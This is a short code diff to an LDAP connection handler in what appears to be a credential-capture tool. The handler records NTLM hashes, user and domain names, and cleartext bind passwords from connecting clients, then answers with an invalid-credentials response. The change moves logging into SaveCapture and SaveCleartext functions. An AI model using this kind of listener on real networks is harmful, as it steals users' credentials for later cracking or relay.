@@ -133,10 +133,7 @@ func HandleLDAP(c net.Conn) {
 					core.LogVerbose("LDAP NTLM parse: %v", err)
 					return
 				}
-				core.LogSuccess("[LDAP] %s captured from %s", ntlmVer, c.RemoteAddr())
-				core.LogSuccess("       %s\\%s", domain, user)
-				core.LogSuccess("       %s", hash)
-				core.SaveHash(hash)
+				core.SaveCapture("LDAP", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
 				resp := ldapBindResponse(msgID, 49, nil)
 				c.Write(resp)
 				return
@@ -150,7 +147,7 @@ func HandleLDAP(c net.Conn) {
 			}
 			pass := string(bindBody[simpleOff : simpleOff+simpleLen])
 			if pass != "" {
-				core.LogSuccess("[LDAP] Cleartext bind from %s: password=%q", c.RemoteAddr(), pass)
+				core.SaveCleartext("LDAP", c.RemoteAddr().String(), "", "", pass)
 			}
 			resp := ldapBindResponse(msgID, 49, nil)
 			c.Write(resp)
